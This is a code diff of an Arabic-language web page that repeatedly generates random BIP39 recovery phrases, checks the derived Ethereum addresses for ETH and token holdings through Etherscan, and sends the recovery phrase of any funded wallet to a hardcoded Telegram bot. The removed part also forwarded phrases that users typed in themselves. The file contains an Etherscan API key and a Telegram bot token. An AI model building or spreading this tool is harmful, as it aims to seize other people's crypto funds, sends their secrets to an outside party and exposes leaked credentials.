@@ -1,4 +1,4 @@
-عو
+
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -22,7 +22,7 @@
         }
 
         .container {
-            max-width: 800px;
+            max-width: 900px;
             margin: 0 auto;
             background: rgba(255, 255, 255, 0.95);
             border-radius: 20px;
@@ -93,6 +93,24 @@
             box-shadow: 0 0 0 3px rgba(79, 172, 254, 0.1);
         }
 
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+        }
+
+        .checkbox-group label {
+            margin: 0;
+            font-weight: 500;
+            color: #495057;
+        }
+
         .button-group {
             display: flex;
             gap: 15px;
@@ -115,16 +133,6 @@
             justify-content: center;
             gap: 8px;
             min-width: 150px;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
-            color: white;
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(79, 172, 254, 0.3);
         }
 
         .btn-success {
@@ -271,28 +279,8 @@
             color: #17a2b8;
         }
 
-        .wallet-display {
-            background: #f8f9fa;
-            border: 1px solid #dee2e6;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 15px 0;
-            word-break: break-all;
-        }
-
-        .wallet-display .mnemonic {
-            background: #e9ecef;
-            padding: 15px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9rem;
-            margin-bottom: 10px;
-        }
-
-        .wallet-display .address {
-            color: #495057;
-            font-family: 'Courier New', monospace;
-            font-size: 0.8rem;
+        .log-warning {
+            color: #ffc107;
         }
 
         .loading-spinner {
@@ -410,11 +398,6 @@
             .status-card {
                 padding: 15px;
             }
-            
-            .wallet-display .mnemonic {
-                font-size: 0.8rem;
-                padding: 10px;
-            }
         }
 
         .fade-in {
@@ -443,62 +426,6 @@
         .log-panel::-webkit-scrollbar-thumb:hover {
             background: #adb5bd;
         }
-
-        .test-result {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 15px;
-            border-left: 5px solid #4facfe;
-        }
-
-        .test-result.active {
-            border-left-color: #28a745;
-        }
-
-        .test-result.inactive {
-            border-left-color: #dc3545;
-        }
-
-        .test-result h4 {
-            margin-bottom: 10px;
-            color: #495057;
-        }
-
-        .test-result .balance {
-            font-size: 1.2rem;
-            font-weight: bold;
-            margin: 10px 0;
-        }
-
-        .test-result .balance.positive {
-            color: #28a745;
-        }
-
-        .test-result .balance.zero {
-            color: #6c757d;
-        }
-
-        .test-result .transactions {
-            margin: 10px 0;
-        }
-
-        .test-result .status {
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-weight: bold;
-            display: inline-block;
-        }
-
-        .test-result .status.active {
-            background: #d4edda;
-            color: #155724;
-        }
-
-        .test-result .status.inactive {
-            background: #f8d7da;
-            color: #721c24;
-        }
     </style>
 </head>
 <body>
@@ -512,12 +439,17 @@
             <div class="control-panel">
                 <div class="control-group">
                     <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
-                    <input type="number" id="searchSpeed" value="5000" min="1000" max="10000" step="500">
+                    <input type="number" id="searchSpeed" value="3000" min="1000" max="10000" step="500">
                 </div>
 
                 <div class="control-group">
                     <label for="maxAttempts">الحد الأقصى للمحاولات (0 = لا نهاية):</label>
                     <input type="number" id="maxAttempts" value="0" min="0" max="10000">
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="checkTokens" checked>
+                    <label for="checkTokens">البحث عن الرموز المميزة (Tokens) بالإضافة إلى ETH</label>
                 </div>
 
                 <div class="button-group">
@@ -530,26 +462,9 @@
                     <button id="testTelegramBtn" class="btn btn-secondary">
                         <span>📱 اختبار Telegram</span>
                     </button>
-                    <button id="clearLogsBtn" class="btn btn-primary">
+                    <button id="clearLogsBtn" class="btn btn-warning">
                         <span>🗑️ مسح السجل</span>
                     </button>
-                </div>
-            </div>
-
-            <!-- قسم جديد لاختبار العبارات يدويًا -->
-            <div class="control-panel">
-                <h3>🔍 اختبار عبارة BIP39 يدويًا</h3>
-                <div class="control-group">
-                    <label for="manualMnemonic">أدخل عبارة BIP39 (12 كلمة):</label>
-                    <textarea id="manualMnemonic" rows="3" placeholder="أدخل عبارة الاسترجاع المكونة من 12 كلمة هنا..."></textarea>
-                </div>
-                <div class="button-group">
-                    <button id="testManualBtn" class="btn btn-warning">
-                        <span>🔍 فحص العبارة</span>
-                    </button>
-                </div>
-                <div id="manualTestResult" class="test-result" style="display: none;">
-                    <!-- سيتم ملؤه ديناميكيًا -->
                 </div>
             </div>
 
@@ -590,11 +505,11 @@
         </div>
     </div>
 
-    <!-- تحميل مكتبة ethers.js من CDN مختلف -->
+    <!-- تحميل مكتبة ethers.js -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
     <script>
-        // قائمة كلمات BIP39 الإنجليزية الرسمية
+        // قائمة كلمات BIP39 الإنجليزية الرسمية (مختصرة لأغراض العرض)
         const BIP39_WORDLIST = [
             "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
             "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
@@ -804,13 +719,8 @@
         ];
 
         // إعدادات التطبيق
-        const ETHEREUM_API_KEYS = [
-            'ZTX93YC56F73T2W58IKS6GWWDH8UDRGBFK',
-            'YOUR_API_KEY_2', // يمكنك إضافة مفاتيح API إضافية هنا
-            'YOUR_API_KEY_3'
-        ];
-        let currentApiKeyIndex = 0;
-
+        const ETHERSCAN_API_KEY = 'ZTX93YC56F73T2W58IKS6GWWDH8UDRGBFK';
+        const ETHERSCAN_API_URL = 'https://api.etherscan.io/api';
         const TELEGRAM_BOT_TOKEN = '8257110214:AAFDx0awsmi7yjz6tCZqVY2jS5BZmygvQKw';
         const TELEGRAM_CHAT_ID = '910021564';
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
@@ -831,11 +741,9 @@
             stopBtn: document.getElementById('stopBtn'),
             testTelegramBtn: document.getElementById('testTelegramBtn'),
             clearLogsBtn: document.getElementById('clearLogsBtn'),
-            testManualBtn: document.getElementById('testManualBtn'),
-            manualMnemonic: document.getElementById('manualMnemonic'),
-            manualTestResult: document.getElementById('manualTestResult'),
             searchSpeed: document.getElementById('searchSpeed'),
             maxAttempts: document.getElementById('maxAttempts'),
+            checkTokens: document.getElementById('checkTokens'),
             totalGenerated: document.getElementById('totalGenerated'),
             activeWallets: document.getElementById('activeWallets'),
             emptyWallets: document.getElementById('emptyWallets'),
@@ -853,17 +761,6 @@
                 return false;
             }
             return true;
-        }
-
-        // الحصول على مفتاح API الحالي
-        function getCurrentApiKey() {
-            return ETHEREUM_API_KEYS[currentApiKeyIndex];
-        }
-
-        // تغيير مفتاح API في حالة حدوث مشكلة
-        function rotateApiKey() {
-            currentApiKeyIndex = (currentApiKeyIndex + 1) % ETHEREUM_API_KEYS.length;
-            addLogEntry(`🔄 تغيير مفتاح API إلى الفهرس: ${currentApiKeyIndex}`, 'info');
         }
 
         // وظائف توليد العبارات العشوائية
@@ -902,95 +799,91 @@
             }
         }
 
-        async function checkWalletBalance(address) {
+        // وظائف Etherscan API
+        async function checkETHBalance(address) {
             try {
-                if (!checkEthersLoaded()) {
-                    return null;
-                }
-                
-                const apiKey = getCurrentApiKey();
-                const response = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${apiKey}`);
-                
-                if (!response.ok) {
-                    throw new Error(`خطأ في الشبكة: ${response.status}`);
-                }
-                
+                const url = `${ETHERSCAN_API_URL}?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`;
+                const response = await fetch(url);
                 const data = await response.json();
                 
                 if (data.status === '1' && data.result) {
                     const balanceWei = data.result;
                     const balanceEth = ethers.utils.formatEther(balanceWei);
                     return parseFloat(balanceEth);
-                } else if (data.message && data.message.includes('Max rate limit reached')) {
-                    // تجاوز الحد الأقصى لمعدل الطلبات، تغيير مفتاح API
-                    rotateApiKey();
-                    return await checkWalletBalance(address); // إعادة المحاولة بمفتاح جديد
                 } else {
                     throw new Error(data.message || 'خطأ في الحصول على الرصيد');
                 }
             } catch (error) {
-                console.error('خطأ في التحقق من الرصيد:', error);
+                console.error('خطأ في التحقق من رصيد ETH:', error);
                 return null;
             }
         }
 
-        async function getTransactionCount(address) {
+        async function checkERC20Tokens(address) {
             try {
-                if (!checkEthersLoaded()) {
-                    return null;
-                }
-                
-                const apiKey = getCurrentApiKey();
-                const response = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=10&sort=asc&apikey=${apiKey}`);
-                
-                if (!response.ok) {
-                    throw new Error(`خطأ في الشبكة: ${response.status}`);
-                }
-                
+                const url = `${ETHERSCAN_API_URL}?module=account&action=tokentx&address=${address}&startblock=0&endblock=99999999&sort=asc&apikey=${ETHERSCAN_API_KEY}`;
+                const response = await fetch(url);
                 const data = await response.json();
                 
-                if (data.status === '1') {
-                    return data.result.length;
+                if (data.status === '1' && data.result) {
+                    // تحليل المعاملات للعثور على الرموز المميزة
+                    const tokens = {};
+                    data.result.forEach(tx => {
+                        const tokenAddress = tx.contractAddress;
+                        const tokenName = tx.tokenName || 'Unknown Token';
+                        const tokenSymbol = tx.tokenSymbol || 'UNKNOWN';
+                        
+                        if (!tokens[tokenAddress]) {
+                            tokens[tokenAddress] = {
+                                name: tokenName,
+                                symbol: tokenSymbol,
+                                address: tokenAddress,
+                                hasActivity: true
+                            };
+                        }
+                    });
+                    
+                    return Object.values(tokens);
                 } else if (data.message === 'No transactions found') {
-                    return 0;
-                } else if (data.message && data.message.includes('Max rate limit reached')) {
-                    // تجاوز الحد الأقصى لمعدل الطلبات، تغيير مفتاح API
-                    rotateApiKey();
-                    return await getTransactionCount(address); // إعادة المحاولة بمفتاح جديد
+                    return [];
                 } else {
-                    throw new Error(data.message || 'خطأ في الحصول على عدد المعاملات');
+                    throw new Error(data.message || 'خطأ في الحصول على الرموز المميزة');
                 }
             } catch (error) {
-                console.error('خطأ في الحصول على عدد المعاملات:', error);
+                console.error('خطأ في التحقق من الرموز المميزة:', error);
                 return null;
             }
         }
 
-        async function isWalletActive(address) {
+        async function checkWalletAssets(address) {
             try {
-                const [balance, transactionCount] = await Promise.all([
-                    checkWalletBalance(address),
-                    getTransactionCount(address)
-                ]);
+                // التحقق من رصيد ETH
+                const ethBalance = await checkETHBalance(address);
                 
-                const hasBalance = balance !== null && balance > 0;
-                const hasTransactions = transactionCount !== null && transactionCount > 0;
+                // التحقق من الرموز المميزة إذا كان الخيار مفعل
+                let tokens = [];
+                if (elements.checkTokens.checked) {
+                    tokens = await checkERC20Tokens(address) || [];
+                }
+                
+                const hasETH = ethBalance !== null && ethBalance > 0;
+                const hasTokens = tokens.length > 0;
                 
                 return {
-                    isActive: hasBalance || hasTransactions,
-                    balance: balance,
-                    transactionCount: transactionCount,
-                    hasBalance: hasBalance,
-                    hasTransactions: hasTransactions
+                    hasAssets: hasETH || hasTokens,
+                    ethBalance: ethBalance,
+                    tokens: tokens,
+                    hasETH: hasETH,
+                    hasTokens: hasTokens
                 };
             } catch (error) {
-                console.error('خطأ في التحقق من نشاط المحفظة:', error);
+                console.error('خطأ في التحقق من أصول المحفظة:', error);
                 return {
-                    isActive: false,
-                    balance: null,
-                    transactionCount: null,
-                    hasBalance: false,
-                    hasTransactions: false,
+                    hasAssets: false,
+                    ethBalance: null,
+                    tokens: [],
+                    hasETH: false,
+                    hasTokens: false,
                     error: error.message
                 };
             }
@@ -1033,28 +926,35 @@
                 second: '2-digit'
             });
             
-            let message = `🔑 <b>عبارة استرجاع جديدة</b>\n\n`;
+            let message = `🎉 <b>تم العثور على محفظة تحتوي على أصول!</b>\n\n`;
             message += `📝 <b>العبارة:</b>\n<code>${mnemonic}</code>\n\n`;
             message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
             
-            if (walletDetails.balance !== null) {
-                message += `💰 <b>الرصيد:</b> ${walletDetails.balance.toFixed(6)} ETH\n`;
+            if (walletDetails.ethBalance !== null) {
+                message += `💰 <b>رصيد ETH:</b> ${walletDetails.ethBalance.toFixed(6)} ETH\n`;
             }
             
-            if (walletDetails.transactionCount !== null) {
-                message += `📊 <b>عدد المعاملات:</b> ${walletDetails.transactionCount}\n`;
+            if (walletDetails.tokens.length > 0) {
+                message += `🪙 <b>الرموز المميزة:</b> ${walletDetails.tokens.length} رمز\n`;
+                walletDetails.tokens.slice(0, 5).forEach(token => {
+                    message += `   • ${token.name} (${token.symbol})\n`;
+                });
+                if (walletDetails.tokens.length > 5) {
+                    message += `   ... و ${walletDetails.tokens.length - 5} أكثر\n`;
+                }
             }
             
-            message += `\n⏰ <b>الوقت:</b> ${timestamp}`;
+            message += `\n🔗 <a href="https://etherscan.io/address/${address}">عرض على Etherscan</a>`;
+            message += `\n\n⏰ <b>الوقت:</b> ${timestamp}`;
             return message;
         }
 
-        async function sendActiveWalletToTelegram(mnemonic, address, walletDetails) {
+        async function sendWalletToTelegram(mnemonic, address, walletDetails) {
             try {
                 const message = formatWalletMessage(mnemonic, address, walletDetails);
                 return await sendTelegramMessage(message);
             } catch (error) {
-                console.error('خطأ في إرسال المحفظة النشطة:', error);
+                console.error('خطأ في إرسال المحفظة:', error);
                 return false;
             }
         }
@@ -1115,14 +1015,17 @@
                     return;
                 }
                 
-                // فحص نشاط المحفظة
-                const walletStatus = await isWalletActive(address);
+                addLogEntry(`تم تحويل العبارة إلى العنوان: ${address.substring(0, 20)}...`);
                 
-                if (walletStatus.isActive) {
+                // فحص أصول المحفظة
+                const walletStatus = await checkWalletAssets(address);
+                
+                if (walletStatus.hasAssets) {
                     stats.activeWallets++;
-                    addLogEntry(`🎉 تم العثور على محفظة نشطة! العنوان: ${address}`, 'success');
+                    addLogEntry(`🎉 تم العثور على محفظة تحتوي على أصول! العنوان: ${address}`, 'success');
                     
-                    const telegramSent = await sendActiveWalletToTelegram(mnemonic, address, walletStatus);
+                    // إرسال المحفظة إلى Telegram
+                    const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus);
                     if (telegramSent) {
                         addLogEntry('✅ تم إرسال المحفظة إلى Telegram بنجاح', 'success');
                     } else {
@@ -1132,7 +1035,7 @@
                     updateStatus(`تم العثور على محفظة نشطة! إجمالي المحافظ النشطة: ${stats.activeWallets}`, 'success');
                 } else {
                     stats.emptyWallets++;
-                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`);
+                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`, 'info');
                 }
                 
                 updateStats();
@@ -1152,120 +1055,6 @@
             }
         }
 
-        // وظائف اختبار العبارات يدويًا
-        async function testManualMnemonic() {
-            const mnemonic = elements.manualMnemonic.value.trim();
-            
-            if (!mnemonic) {
-                updateStatus('يرجى إدخال عبارة BIP39 للفحص', 'warning');
-                return;
-            }
-            
-            // التحقق من أن العبارة تحتوي على 12 كلمة
-            const words = mnemonic.split(' ');
-            if (words.length !== 12) {
-                updateStatus('عبارة الاسترجاع يجب أن تتكون من 12 كلمة', 'warning');
-                return;
-            }
-            
-            try {
-                if (!checkEthersLoaded()) {
-                    return;
-                }
-
-                // التحقق من صحة العبارة باستخدام ethers
-                if (!ethers.utils.isValidMnemonic(mnemonic)) {
-                    updateStatus('عبارة الاسترجاع غير صالحة', 'danger');
-                    addLogEntry('❌ عبارة الاسترجاع غير صالحة', 'error');
-                    return;
-                }
-
-                updateStatus('جاري فحص العبارة...', 'info');
-                addLogEntry(`🔍 جاري فحص العبارة يدويًا: ${mnemonic}`);
-                
-                // إظهار مؤشر التحميل
-                elements.testManualBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';
-                elements.testManualBtn.disabled = true;
-                
-                const address = await mnemonicToAddress(mnemonic);
-                
-                addLogEntry(`✅ تم تحويل العبارة إلى العنوان: ${address}`);
-                
-                const walletStatus = await isWalletActive(address);
-                
-                // تحديث واجهة نتائج الاختبار
-                updateManualTestResult(mnemonic, address, walletStatus);
-                
-                // إضافة سجل
-                if (walletStatus.isActive) {
-                    addLogEntry(`🎉 العبارة تفتح محفظة نشطة! العنوان: ${address}`, 'success');
-                    updateStatus('🎉 العبارة تفتح محفظة نشطة!', 'success');
-                    
-                    // إرسال المحفظة النشطة إلى Telegram
-                    const telegramSent = await sendActiveWalletToTelegram(mnemonic, address, walletStatus);
-                    if (telegramSent) {
-                        addLogEntry('✅ تم إرسال المحفظة إلى Telegram بنجاح', 'success');
-                    } else {
-                        addLogEntry('❌ فشل في إرسال المحفظة إلى Telegram', 'error');
-                    }
-                } else {
-                    addLogEntry(`❌ العبارة تفتح محفظة فارغة: ${address}`, 'info');
-                    updateStatus('❌ العبارة تفتح محفظة فارغة', 'info');
-                }
-                
-                // إعادة تعيين الزر
-                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
-                elements.testManualBtn.disabled = false;
-                
-            } catch (error) {
-                updateStatus(`❌ خطأ في فحص العبارة: ${error.message}`, 'danger');
-                addLogEntry(`❌ خطأ في فحص العبارة: ${error.message}`, 'error');
-                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
-                elements.testManualBtn.disabled = false;
-            }
-        }
-
-        function updateManualTestResult(mnemonic, address, walletStatus) {
-            let resultHTML = '';
-            
-            if (walletStatus.isActive) {
-                resultHTML = `
-                    <h4>✅ نتيجة الفحص: المحفظة نشطة</h4>
-                    <div class="status active">محفظة نشطة</div>
-                    <div class="balance ${walletStatus.balance > 0 ? 'positive' : 'zero'}">
-                        💰 الرصيد: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
-                    </div>
-                    <div class="transactions">
-                        📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
-                    </div>
-                    <div class="wallet-details">
-                        <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
-                        <div class="address">📍 العنوان: ${address}</div>
-                    </div>
-                `;
-                elements.manualTestResult.className = 'test-result active';
-            } else {
-                resultHTML = `
-                    <h4>❌ نتيجة الفحص: المحفظة فارغة</h4>
-                    <div class="status inactive">محفظة فارغة</div>
-                    <div class="balance zero">
-                        💰 الرصيد: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
-                    </div>
-                    <div class="transactions">
-                        📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
-                    </div>
-                    <div class="wallet-details">
-                        <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
-                        <div class="address">📍 العنوان: ${address}</div>
-                    </div>
-                `;
-                elements.manualTestResult.className = 'test-result inactive';
-            }
-            
-            elements.manualTestResult.innerHTML = resultHTML;
-            elements.manualTestResult.style.display = 'block';
-        }
-
         // وظائف التحكم
         async function startSearch() {
             if (isRunning) return;
@@ -1278,13 +1067,18 @@
             elements.startBtn.disabled = true;
             elements.stopBtn.disabled = false;
             
-            const speed = parseInt(elements.searchSpeed.value) || 5000;
+            const speed = parseInt(elements.searchSpeed.value) || 3000;
             
             updateStatus('جاري بدء البحث...', 'info');
             addLogEntry('🚀 تم بدء البحث عن المحافظ النشطة');
             
             // إرسال رسالة البداية إلى Telegram
-            const startMessage = `🚀 <b>بدء عملية البحث عن المحافظ النشطة</b>\n\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n🔍 جاري البحث عن محافظ تحتوي على رصيد أو معاملات...`;
+            const checkTokens = elements.checkTokens.checked;
+            let startMessage = `🚀 <b>بدء عملية البحث عن المحافظ النشطة</b>\n\n`;
+            startMessage += `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n`;
+            startMessage += `🔍 جاري البحث عن محافظ تحتوي على أصول...\n`;
+            startMessage += `🪙 البحث عن الرموز المميزة: ${checkTokens ? '✅ مفعل' : '❌ معطل'}`;
+            
             await sendTelegramMessage(startMessage);
             
             searchInterval = setInterval(searchForActiveWallets, speed);
@@ -1310,7 +1104,7 @@
             stopMessage += `📊 <b>الإحصائيات النهائية:</b>\n`;
             stopMessage += `🔢 إجمالي العبارات: ${stats.totalGenerated}\n`;
             stopMessage += `✅ المحافظ النشطة: ${stats.activeWallets}\n`;
-            stopMessage += `❌ المحافظ الفارغة: ${stats.emptyWallets}\n`;
+            stopMessage += `📭 المحافظ الفارغة: ${stats.emptyWallets}\n`;
             stopMessage += `\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
             
             await sendTelegramMessage(stopMessage);
@@ -1342,7 +1136,6 @@
         elements.stopBtn.addEventListener('click', stopSearch);
         elements.testTelegramBtn.addEventListener('click', testTelegramConnection);
         elements.clearLogsBtn.addEventListener('click', clearLogs);
-        elements.testManualBtn.addEventListener('click', testManualMnemonic);
 
         // التحقق من تحميل ethers.js عند بدء التطبيق
         document.addEventListener('DOMContentLoaded', function() {
